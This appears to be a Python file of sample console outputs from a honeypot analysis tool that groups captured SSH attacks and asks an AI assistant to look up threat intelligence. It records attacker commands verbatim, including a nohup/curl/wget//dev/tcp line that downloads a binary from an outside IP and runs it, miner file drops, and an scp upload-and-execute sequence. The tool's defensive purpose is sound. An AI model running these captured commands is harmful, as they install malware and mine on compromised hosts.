#  'system',                                                #
#  'ping;sh',                                               #
#  'kill %%1',                                              #
#  '',                                                      #
#  '/bin/busybox cat /proc/self/exe || cat /proc/self/exe'] #
#                                                           #
#############################################################

...Truncated...
Honeypot AI Finished Successfully!    
    """,



    "organize_attacks": """
lucasfaudman@Lucass-MacBook-Pro testenv % honeypot-ai/run.sh -lfl  --organize-attacks --max-ips-per-attack 10
Starting honeypot-ai...

Loading attacks from logs directory at /Users/lucasfaudman/Documents/SANS/testenv/logs
Skipping attack ffd79baff1ac4708922e81990f239012311844465b35189b44c0fddb074c2a70 with 35 IPs (max_ips_per_attack=10)
Skipping attack 85eb37329ba115f18c3f60c8d979b23f56a9bb38b35e5cf19d544e12b5b2bbc8 with 14 IPs (max_ips_per_attack=10)
Organizing attacks into attack directories at /Users/lucasfaudman/Documents/SANS/testenv/attacks
Prepared regex pattern: b'(35\\.85\\.244\\.164|35\\.85\\.237\\.231|44\\.229\\.31\\.222|44\\.233\\.198\\.138|54\\.187\\.66\\.79|3\\.238\\.240\\.225|194\\.67\\.201\\.41|54\\.222\\.143\\.33|52\\.80\\.229\\.231|52\\.81\\.27\\.255|103\\.163\\.215\\.12|164\\.90\\.163\\.107|49\\.234\\.50\\.52|44\\.207\\.239\\.204|128\\.199\\.218\\.182|143\\.198\\.46\\.19|128\\.199\\.22\\.193|59\\.4\\.55\\.180|103\\.130\\.189\\.246|113\\.111\\.174\\.87|182\\.31\\.217\\.18|150\\.158\\.27\\.38|182\\.72\\.219\\.186|66\\.240\\.205\\.34|104\\.237\\.135\\.225|192\\.155\\.86\\.241|23\\.92\\.24\\.103|72\\.14\\.181\\.67|117\\.190\\.226\\.115|222\\.111\\.179\\.159|31\\.208\\.22\\.102|73\\.43\\.215\\.50|18\\.138\\.212\\.58|18\\.116\\.202\\.221|13\\.250\\.8\\.18|185\\.180\\.143\\.49|45\\.156\\.129\\.2|185\\.180\\.143\\.141|164\\.92\\.192\\.25|134\\.122\\.89\\.242|138\\.68\\.163\\.10|68\\.69\\.186\\.30|45\\.142\\.182\\.77|91\\.92\\.243\\.232|93\\.223\\.169\\.159|27\\.93\\.25\\.111|111\\.216\\.194\\.148|172\\.104\\.228\\.72|93\\.123\\.85\\.82|91\\.92\\.243\\.65|202\\.90\\.136\\.204|149\\.127\\.191\\.44|91\\.92\\.249\\.164|94\\.156\\.65\\.188|192\\.227\\.146\\.253|123\\.99\\.201\\.37|221\\.160\\.138\\.230|112\\.168\\.208\\.76|41\\.160\\.238\\.201|218\\.145\\.61\\.20|188\\.166\\.224\\.136|91\\.92\\.243\\.167|185\\.224\\.128\\.191|185\\.180\\.143\\.80|23\\.20\\.205\\.139|43\\.135\\.123\\.64|43\\.132\\.196\\.160|20\\.197\\.51\\.98|103\\.121\\.39\\.54|120\\.63\\.180\\.123|47\\.105\\.33\\.16|102\\.37\\.103\\.237|45\\.95\\.147\\.236|47\\.120\\.37\\.43|14\\.41\\.43\\.78|62\\.171\\.167\\.21|3\\.93\\.0\\.214|103\\.85\\.95\\.36|95\\.214\\.53\\.103|193\\.32\\.162\\.174|172\\.98\\.33\\.206|188\\.166\\.174\\.44|178\\.72\\.69\\.244|95\\.214\\.53\\.99)'
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/7ea3ab134f5340790a7a9d64915c9aa8418f3c9707cff0ab76b2ce4e33da9656/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/7ab552f01de999cb12092166cdc36fd68a0edbb33927e0ef3d26f4ee6449f804/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/28ba533b0f3c4df63d6b4a5ead73860697bdf735bb353e4ca928474889eb8a15/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/1bd476ad78c1f8fd54963653f838e608ef25d8a0a9e84a54fcd1b3889ada6fae/auth_random.json
Created /Users/lucasfaudman/Documents/SANS/testenv/attacks/1ae2a0aa7da872071305a1170015dfebfd7e40ebb8cb16a15979522836b53687/auth_random.json
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/http.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/ntp.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/telemetry.log
Started organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/packet_filter.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/zeek/packet_filter.log
Done organizing /Users/lucasfaudman/Documents/SANS/testenv/logs/web/webhoneypot-2024-01-20.json
...Truncated...
Done organizing attack directories
Finished organizing attacks into attack directories at /Users/lucasfaudman/Documents/SANS/testenv/attacks
Honeypot AI Finished Successfully!    
    """,



    "load_from_attacks_dir": """

Attack (hhash: 1bd476ad78c1f8fd54963653f838e608ef25d8a0a9e84a54fcd1b3889ada6fae), SourceIPs: 5, Sessions: 279, HTTP: 18, Httplogs: 1 
#################
# first_command #
#################
#               #
# None          #
#               #
#################
########################################################################################################################
#                                              most_common3_http_requests                                              #
########################################################################################################################
#                                                                                                                      #
# [("145.ll|'|'|SGFjS2VkX0Q0OTkwNjI3|'|'|WIN-JNAPIER0859|'|'|JNapier|'|'|19-02-01|'|'||'|'|Win "                       #
#   '7 Professional SP1 '                                                                                              #
#   "x64|'|'|No|'|'|0.7d|'|'|..|'|'|AA==|'|'|112.inf|'|'|SGFjS2VkDQoxOTIuMTY4LjkyLjIyMjo1NTUyDQpEZXNrdG9wDQpjbGllbnRhL #
# mV4ZQ0KRmFsc2UNCkZhbHNlDQpUcnVlDQpGYWxzZQ==12.act|'|'|AA= "                                                          #
#   'HTTP/\n',                                                                                                         #
#   10),                                                                                                               #
#  ('GET / HTTP/1.0\n', 4),                                                                                            #
#  ('  HTTP/1.1\n', 4)]                                                                                                #
#                                                                                                                      #
########################################################################################################################
######################
# most_common_src_ip #
######################
#                    #
# '66.240.205.34'    #
#                    #
######################

Attack (chash: 28ba533b0f3c4df63d6b4a5ead73860697bdf735bb353e4ca928474889eb8a15), SourceIPs: 1, Sessions: 1053, SSH: 771, Commands: 29, Cmdlogs: 1, 
#################
# first_command #
#################
#               #
# 'uname -a'    #
#               #
#################
##############################
# most_common3_http_requests #
##############################
#                            #
# []                         #
#                            #
##############################
######################
# most_common_src_ip #
######################
#                    #
# '150.158.27.38'    #
#                    #
######################
...Truncated...    
Honeypot AI Finished Successfully!   
    """,



    "only_attacks": """
lucasfaudman@Lucass-MacBook-Pro testenv % honeypot-ai/run.sh -lfa --only-attacks c4927e4103e250b181e76582991f71a7a3987ccae02ad1fc8cff377e65871199 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c --print-attrs source_ips uniq_dst_ports sessions commands malware
Starting honeypot-ai...

Loading attacks from attacks directory at /Users/lucasfaudman/Documents/SANS/testenv/attacks
Loading 2 attacks in parallel with 2 workers.
WARNING: Output may be jumbled. If errors occur, try again with --load-attacks-max-workers 1
Loading Attack: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x11302b810>
Loading Attack: c4927e4103e250b181e76582991f71a7a3987ccae02ad1fc8cff377e65871199
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x10fc7f610>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x11302bb50>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x10fda7850>
Loaded Attack: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c
Loaded Attack: c4927e4103e250b181e76582991f71a7a3987ccae02ad1fc8cff377e65871199
(4->4) - Removed 0 attacks with ips ['216.243.47.166', '172.31.5.68', '54.67.87.80']
Attempting merge 36: b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f <- c4927e4103e250b181e76582991f71a7a3987ccae02ad1fc8cff377e65871199 by malware_urls
Merged 0 attacks by out of 36 attempts (0.0000%) 
Merge Attacks Time: 0.0058s
(4->4) - Merged 0 attacks with shared attrs
Regex merged 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 into 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c on commands: re.compile('cd /tmp && chmod \\+x [\\w\\d]+ && bash -c ./[\\w\\d]+')
Regex merged b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f into 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c on commands: re.compile('cd /tmp && chmod \\+x [\\w\\d]+ && bash -c ./[\\w\\d]+')
(4->2) - Merged 2 attacks with shared sig regexes


Attack (chash: c4927e4103e250b181e76582991f71a7a3987ccae02ad1fc8cff377e65871199), SourceIPs: 1, Sessions: 3, SSH: 2, Commands: 21, Cmdlogs: 1, 
#############################################################################################
#                                         source_ips                                        #
#############################################################################################
#                                                                                           #
# [SourceIP 47.120.37.43 Sessions: 3, Successful Logins: 1, Commands: 21, Zeek Events: 4, ] #
#                                                                                           #
#############################################################################################
##################
# uniq_dst_ports #
##################
#                #
# {2222}         #
#                #
##################
########################################################################################################################
#                                                       sessions                                                       #
########################################################################################################################
#                                                                                                                      #
# [Session CZTsog4mK2qlnX5z39 CONN 47.120.37.43:39554 -> 172.31.5.68:2222 Duration: 0.00s,                             #
#  Session ClTf1A34WgU8CTeDal SSH 47.120.37.43:37534 -> 172.31.5.68:2222 Duration: 0.00s,                              #
#  Session 3334db81db98 SSH 47.120.37.43:37534 -> 172.31.5.68:2222 Login: root:12345678 Commands: 21, Duration: 0.11s] #
#                                                                                                                      #
########################################################################################################################
########################################################################################################################
#                                                       commands                                                       #
########################################################################################################################
#                                                                                                                      #
# ['echo 1 && cat /bin/echo',                                                                                          #
#  'nohup $SHELL -c "curl http://108.181.122.221:60101/linux -o /tmp/1d0xrd25u0; '                                     #
#  'if [ ! -f /tmp/1d0xrd25u0 ]; then wget http://108.181.122.221:60101/linux -O '                                     #
#  '/tmp/1d0xrd25u0; fi; if [ ! -f /tmp/1d0xrd25u0 ]; then exec '                                                      #
#  "6<>/dev/tcp/108.181.122.221/60101 && echo -n 'GET /linux' >&6 && cat 0<&6 > "                                      #
#  '/tmp/1d0xrd25u0 && chmod +x /tmp/1d0xrd25u0 && /tmp/1d0xrd25u0 '                                                   #
#  'Np6ZfDVXj4ZII32ajFlFjJl2O0mPjkgteJGQQkaQkXsjS4+ETz19nI5XQ4mGfT9JkI1OI3ibhEFHj5l4LU2JkEg9dIaMREWQnHo3T46PSzxsno9ZRo #
# 2QYjxBi5BLPniSiEdGipBsNVeMj04jfpmHWUKHkno9SIyLWT51ho9BQpCZdDpXj4ZKN3qYj0RCnpx1I0yPkEA6YpqPTUGOmXg9WYyPQCN9nYxZRoaRYj #
# xNioRPPX2ZiVdGjpBiPEGPkEg/foaMRUaEnnw8SY+eTT5imYtBWYyZfCNIjo9DO3yZj0dXjJp8I0uOjVc/foaMQ0SEnnw8S46eQSN+mYdZQo+GfjhMhI #
# hJPH+RnkZGiYZ+PleLiVc+fpKIR0aNmWw5TpCMTT9imYhBWYqYdjtJj4pBLXSGjEZAkJl9PFeNiEM7fJmPQVePmX0jSIeKVz9/n5BARoSefDxIip5NOm #
# KaikRZj5t8I0uKj0M7fJmOQVePmHojTIyQQDximo9GTYiYfT5Bno9IPGKcillGiJpiPEqKhE89fZqPV0aOnmI6TZCPSzVinopNQY6ZeDxZiI9XPHSYkE #
# BOkJp8NEOIjkg8foiKRVmPkX8jSIyKVzV+kohHRoqdbDxLjJBLP3qGik5ZjJh+N0+Oj0k+bJGKWUaNmWI8SYqQSz16kohHRo2bejLf/tBaGacj3bJ3jA #
# 3v4Q==; '                                                                                                            #
#  'fi; echo 12345678 > /tmp/.opass; chmod +x /tmp/1d0xrd25u0 && /tmp/1d0xrd25u0 '                                     #
#  'Np6ZfDVXj4ZII32ajFlFjJl2O0mPjkgteJGQQkaQkXsjS4+ETz19nI5XQ4mGfT9JkI1OI3ibhEFHj5l4LU2JkEg9dIaMREWQnHo3T46PSzxsno9ZRo #
# 2QYjxBi5BLPniSiEdGipBsNVeMj04jfpmHWUKHkno9SIyLWT51ho9BQpCZdDpXj4ZKN3qYj0RCnpx1I0yPkEA6YpqPTUGOmXg9WYyPQCN9nYxZRoaRYj #
# xNioRPPX2ZiVdGjpBiPEGPkEg/foaMRUaEnnw8SY+eTT5imYtBWYyZfCNIjo9DO3yZj0dXjJp8I0uOjVc/foaMQ0SEnnw8S46eQSN+mYdZQo+GfjhMhI #
# hJPH+RnkZGiYZ+PleLiVc+fpKIR0aNmWw5TpCMTT9imYhBWYqYdjtJj4pBLXSGjEZAkJl9PFeNiEM7fJmPQVePmX0jSIeKVz9/n5BARoSefDxIip5NOm #
# KaikRZj5t8I0uKj0M7fJmOQVePmHojTIyQQDximo9GTYiYfT5Bno9IPGKcillGiJpiPEqKhE89fZqPV0aOnmI6TZCPSzVinopNQY6ZeDxZiI9XPHSYkE #
# BOkJp8NEOIjkg8foiKRVmPkX8jSIyKVzV+kohHRoqdbDxLjJBLP3qGik5ZjJh+N0+Oj0k+bJGKWUaNmWI8SYqQSz16kohHRo2bejLf/tBaGacj3bJ3jA #
# 3v4Q==" '                                                                                                            #
#  '&',                                                                                                                #
#  'head -c 0 > /tmp/UVPRQdahjX',                                                                                      #
#  'chmod 777 /tmp/UVPRQdahjX',                                                                                        #
#  '/tmp/UVPRQdahjX '                                                                                                  #
#  'Np6ZfDVXj4ZII32ajFlFjJl2O0mPjkgteJGQQkaQkXsjS4+ETz19nI5XQ4mGfT9JkI1OI3ibhEFHj5l4LU2JkEg9dIaMREWQnHo3T46PSzxsno9ZRo #
# 2QYjxBi5BLPniSiEdGipBsNVeMj04jfpmHWUKHkno9SIyLWT51ho9BQpCZdDpXj4ZKN3qYj0RCnpx1I0yPkEA6YpqPTUGOmXg9WYyPQCN9nYxZRoaRYj #
# xNioRPPX2ZiVdGjpBiPEGPkEg/foaMRUaEnnw8SY+eTT5imYtBWYyZfCNIjo9DO3yZj0dXjJp8I0uOjVc/foaMQ0SEnnw8S46eQSN+mYdZQo+GfjhMhI #
# hJPH+RnkZGiYZ+PleLiVc+fpKIR0aNmWw5TpCMTT9imYhBWYqYdjtJj4pBLXSGjEZAkJl9PFeNiEM7fJmPQVePmX0jSIeKVz9/n5BARoSefDxIip5NOm #
# KaikRZj5t8I0uKj0M7fJmOQVePmHojTIyQQDximo9GTYiYfT5Bno9IPGKcillGiJpiPEqKhE89fZqPV0aOnmI6TZCPSzVinopNQY6ZeDxZiI9XPHSYkE #
# BOkJp8NEOIjkg8foiKRVmPkX8jSIyKVzV+kohHRoqdbDxLjJBLP3qGik5ZjJh+N0+Oj0k+bJGKWUaNmWI8SYqQSz16kohHRo2bejLf/tBaGacj3bJ3jA #
# 3v4Q==',                                                                                                             #
#  'cp /tmp/UVPRQdahjX /tmp/linux',                                                                                    #
#  'head -c 0 > /tmp/winminer_sign',                                                                                   #
#  'head -c 0 > /tmp/winminer',                                                                                        #
#  'head -c 0 > /tmp/linux_sign',                                                                                      #
#  'head -c 0 > /tmp/mipsel_linux_sign',                                                                               #
#  'head -c 0 > /tmp/mips_linux',                                                                                      #
#  'head -c 0 > /tmp/mips_linux_sign',                                                                                 #
#  'head -c 0 > /tmp/windows_sign',                                                                                    #
#  'head -c 0 > /tmp/arm_linux_sign',                                                                                  #
#  'head -c 0 > /tmp/miner',                                                                                           #
#  'head -c 0 > /tmp/mipsel_linux',                                                                                    #
#  'head -c 0 > /tmp/windows',                                                                                         #
#  'head -c 0 > /tmp/arm_linux',                                                                                       #
#  'head -c 0 > /tmp/miner_sign',                                                                                      #
#  '',                                                                                                                 #
#  'exit']                                                                                                             #
#                                                                                                                      #
########################################################################################################################
###########
# malware #
###########
#         #
# []      #
#         #
###########



Attack (mhash: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c), SourceIPs: 3, Sessions: 24, SSH: 20, Commands: 3, Cmdlogs: 4, Malware: 3 
#############################################################################################################
#                                                 source_ips                                                #
#############################################################################################################
#                                                                                                           #
# [SourceIP 93.223.169.159 Sessions: 10, Successful Logins: 2, Commands: 3, Downloads 1, Zeek Events: 14, , #
#  SourceIP 27.93.25.111 Sessions: 7, Successful Logins: 2, Commands: 3, Downloads 1, Zeek Events: 8, ,     #
#  SourceIP 111.216.194.148 Sessions: 7, Successful Logins: 2, Commands: 3, Downloads 1, Zeek Events: 8, ]  #
#                                                                                                           #
#############################################################################################################
##################
# uniq_dst_ports #
##################
#                #
# {22, 2222}     #
#                #
##################
########################################################################################################################
#                                                       sessions                                                       #
########################################################################################################################
#                                                                                                                      #
# [Session CmMj7Y1TLuJ5YCKDWl CONN 93.223.169.159:60702 -> 172.31.5.68:22 Duration: 0.00s,                             #
#  Session CTCt4bY4cLQCcH5Si SSH 93.223.169.159:47114 -> 172.31.5.68:22 Duration: 0.00s,                               #
#  Session CnN1Ae1hMulVtjCKi6 SSH 93.223.169.159:47118 -> 172.31.5.68:22 Duration: 0.00s,                              #
#  Session C06KgE3PnupO2F8u27 CONN 93.223.169.159:49808 -> 172.31.5.68:22 Duration: 0.00s,                             #
#  Session CQi9zfVW7vj47v0A9 SSH 93.223.169.159:46966 -> 172.31.5.68:22 Duration: 0.00s,                               #
#  Session Cz65Bp3E9Yx7GOGZf8 SSH 93.223.169.159:46970 -> 172.31.5.68:22 Duration: 0.00s,                              #
#  Session CkS27i1cg6LfTwb3Oi SSH 93.223.169.159:47004 -> 172.31.5.68:22 Duration: 0.00s,                              #
#  Session 76647820c016 SSH 93.223.169.159:46966 -> 172.31.5.68:2222 Duration: 0.35s,                                  #
#  Session fa6fb05e952d SSH 93.223.169.159:46970 -> 172.31.5.68:2222 Login: pi:raspberry Commands: 1, Malware: 1, Dura #
# tion: 0.87s,                                                                                                         #
#  Session 3383f6a6a93c SSH 93.223.169.159:47004 -> 172.31.5.68:2222 Login: pi:raspberry Commands: 2, Duration: 0.70s, #
#  Session C5rS7g4QnQp42gbcGd CONN 27.93.25.111:50916 -> 172.31.5.68:22 Duration: 0.00s,                               #
#  Session CMy02v1pudNB2CRKZ7 SSH 27.93.25.111:52094 -> 172.31.5.68:22 Duration: 0.00s,                                #
#  Session CKKbJDBalq1TZbmF6 SSH 27.93.25.111:52102 -> 172.31.5.68:22 Duration: 0.00s,                                 #
#  Session CHGw7y4ZZUIK7GA6De SSH 27.93.25.111:52146 -> 172.31.5.68:22 Duration: 0.00s,                                #
#  Session CYkNc83gU5wuP2Slq2 CONN 111.216.194.148:49512 -> 172.31.5.68:22 Duration: 0.00s,                            #
#  Session CT4tTu4hPvKdx6ZkLe SSH 111.216.194.148:52912 -> 172.31.5.68:22 Duration: 0.00s,                             #
#  Session CLMsKD2iQhsMaDU1nk SSH 111.216.194.148:52922 -> 172.31.5.68:22 Duration: 0.00s,                             #
#  Session C1Z4MD4DurN46YY8Ra SSH 111.216.194.148:52964 -> 172.31.5.68:22 Duration: 0.00s,                             #
#  Session b183188057b3 SSH 27.93.25.111:52094 -> 172.31.5.68:2222 Duration: 0.15s,                                    #
#  Session a9ffcecc6796 SSH 27.93.25.111:52102 -> 172.31.5.68:2222 Login: pi:raspberryraspberry993311 Commands: 1, Mal #
# ware: 1, Duration: 0.57s,                                                                                            #
#  Session 6c83f979e0b5 SSH 27.93.25.111:52146 -> 172.31.5.68:2222 Login: pi:raspberryraspberry993311 Commands: 2, Dur #
# ation: 0.46s,                                                                                                        #
#  Session 617df930d4a6 SSH 111.216.194.148:52912 -> 172.31.5.68:2222 Duration: 0.09s,                                 #
#  Session c0a95962c75a SSH 111.216.194.148:52922 -> 172.31.5.68:2222 Login: pi:raspberryraspberry993311 Commands: 1,  #
# Malware: 1, Duration: 0.52s,                                                                                         #
#  Session 9a98fb146784 SSH 111.216.194.148:52964 -> 172.31.5.68:2222 Login: pi:raspberryraspberry993311 Commands: 2,  #
# Duration: 0.28s]                                                                                                     #
#                                                                                                                      #
########################################################################################################################
##########################################################
#                        commands                        #
##########################################################
#                                                        #
# ['scp -t /tmp/BUwTrLEj',                               #
#  'cd /tmp && chmod +x BUwTrLEj && bash -c ./BUwTrLEj', #
#  './BUwTrLEj']                                         #
#                                                        #
##########################################################
########################################################################################################################
#                                                       malware                                                        #
########################################################################################################################
#                                                                                                                      #
# [Malware 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c: Size: 4766 bytes Type: application/octet- #
# stream Downloaded by: 93.223.169.159 Session fa6fb05e952d ,                                                          #
#  Malware 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51: Size: 4766 bytes Type: application/octet- #
# stream Downloaded by: 27.93.25.111 Session a9ffcecc6796 ,                                                            #
#  Malware b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f: Size: 4766 bytes Type: application/octet- #
# stream Downloaded by: 111.216.194.148 Session c0a95962c75a ]                                                         #
#                                                                                                                      #
########################################################################################################################

Honeypot AI Finished Successfully!    
    """,



    "analyze_write_export": """
honeypot-ai/run.sh -lfa --only-attack 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c --analyze --write --export
Starting honeypot-ai...

Loading attacks from attacks directory at /Users/lucasfaudman/Documents/SANS/testenv/attacks
Loading Attack: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c
Processing Events from Parser 1 of 2: <loganalyzers.logparser.ZeekParser object at 0x113bc8850>
Processing Events from Parser 2 of 2: <loganalyzers.logparser.CowrieParser object at 0x113d12590>
Processed 78 events (78 cowrie events, 0 zeek events). Found 3 source ips
Loaded Attack: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c
(3->3) - Removed 0 attacks with ips ['216.243.47.166', '172.31.5.68', '54.67.87.80']
Attempting merge 18: 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 <- b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f by malware_urls
Merged 0 attacks by out of 18 attempts (0.0000%) 
Merge Attacks Time: 0.0021s
(3->3) - Merged 0 attacks with shared attrs
Regex merged 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 into 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c on commands: re.compile('cd /tmp && chmod \\+x [\\w\\d]+ && bash -c ./[\\w\\d]+')
Regex merged b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f into 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c on commands: re.compile('cd /tmp && chmod \\+x [\\w\\d]+ && bash -c ./[\\w\\d]+')
(3->1) - Merged 2 attacks with shared sig regexes
Analyzing 1 attacks.
Getting log paths and counts.
Getting ipdata.
Getting data for 93.223.169.159 from isc
Getting data for 93.223.169.159 from whois
Getting data for 93.223.169.159 from cybergordon
Getting data for 93.223.169.159 from threatfox
Getting data for 93.223.169.159 from shodan
Getting data for 27.93.25.111 from isc
Getting data for 27.93.25.111 from whois
Getting data for 27.93.25.111 from cybergordon
Getting data for 27.93.25.111 from threatfox
Getting data for 27.93.25.111 from shodan
Getting data for 111.216.194.148 from isc
Getting data for 111.216.194.148 from whois
Getting data for 111.216.194.148 from cybergordon
Getting data for 111.216.194.148 from threatfox
Getting data for 111.216.194.148 from shodan
Getting mwdata.
Getting data for 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c from malwarebazaar
Getting data for 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c from threatfox
Getting data for 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 from malwarebazaar
Getting data for 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 from threatfox
Getting data for b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f from malwarebazaar
Getting data for b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f from threatfox
Getting data for 93.223.169.159 from urlhaus
Getting data for 93.223.169.159 from threatfox
Getting data for 27.93.25.111 from urlhaus
Getting data for 27.93.25.111 from threatfox
Getting data for 111.216.194.148 from urlhaus
Getting data for 111.216.194.148 from threatfox
Getting command explanations.
Getting OpenAI resp for message_hash 554a34bd591c612a2521bf473e7956f391d627820a1c6816eb68f118d50b23b3
Writing 554a34bd591c612a2521bf473e7956f391d627820a1c6816eb68f118d50b23b3 to db
Getting malware explanations.
Getting OpenAI resp for message_hash 6b2c514d30f230de6cbb2a79a5b8ca783db9d1b9892742fc976489fb6b045eeb
Writing 6b2c514d30f230de6cbb2a79a5b8ca783db9d1b9892742fc976489fb6b045eeb to db
Getting assistant answers.

Asking: Explain what is known about the hosts, malware, and/or exploits used in the attack using data from MalwareBazaar, ThreatFox, URLhaus, and Malpedia. Be sure to analyze the src_ips, malware hashes, and any urls or hosts found in the malware samples, commands and/or HTTP requests.
Updated asst_yJ9SbR6g98zbMTwfXQHmvrcH: instructions, tools
Status: queued Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Waiting 5 seconds for response
Status: requires_action Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi

AI called tool: get_attack_attrs
with args: {'attrs': ['uniq_src_ips', 'uniq_malware']}

Submitting tool output: {'uniq_src_ips': {'93.223.169.159', '27.93.25.111', '111.216.194.148'}, 'uniq_malware': {Malware 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c: Size: 4766 bytes Type: application/octet-stream Downloaded by: 93.223.169.159 Session fa6fb05e952d , Malware 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51: Size: 4766 bytes Type: application/octet-stream Downloaded by: 27.93.25.111 Session a9ffcecc6796 , Malware b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f: Size: 4766 bytes Type: application/octet-stream Downloaded by: 111.216.194.148 Session c0a95962c75a }}
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Waiting 5 seconds for response
Status: requires_action Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi

AI called tool: get_malware_attrs
with args: {'malware_id': '10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c', 'attrs': ['shasum', 'source_address', 'destfile', 'urls', 'hosts', 'mime_type']}

Submitting tool output: {'shasum': '10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c', 'source_address': '', 'destfile': '', 'urls': [], 'hosts': {}, 'mime_type': 'application/octet-stream'}

AI called tool: get_malware_attrs
with args: {'malware_id': '1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51', 'attrs': ['shasum', 'source_address', 'destfile', 'urls', 'hosts', 'mime_type']}

Submitting tool output: {'shasum': '1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51', 'source_address': '', 'destfile': '', 'urls': [], 'hosts': {}, 'mime_type': 'application/octet-stream'}

AI called tool: get_malware_attrs
with args: {'malware_id': 'b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f', 'attrs': ['shasum', 'source_address', 'destfile', 'urls', 'hosts', 'mime_type']}

Submitting tool output: {'shasum': 'b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f', 'source_address': '', 'destfile': '', 'urls': [], 'hosts': {}, 'mime_type': 'application/octet-stream'}
Status: queued Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Waiting 5 seconds for response
Status: requires_action Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi

AI called tool: query_ioc_data
with args: {'ioc_type': 'hash', 'iocs': ['10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c'], 'sources': ['malwarebazaar', 'threatfox', 'urlhaus']}
Using saved malwarebazaar data hash for 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c
Using saved threatfox data hash for 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c
Getting data for 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c from urlhaus
ERROR: Error caught while getting data for 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c from urlhaus: Invalid arg_type: hash

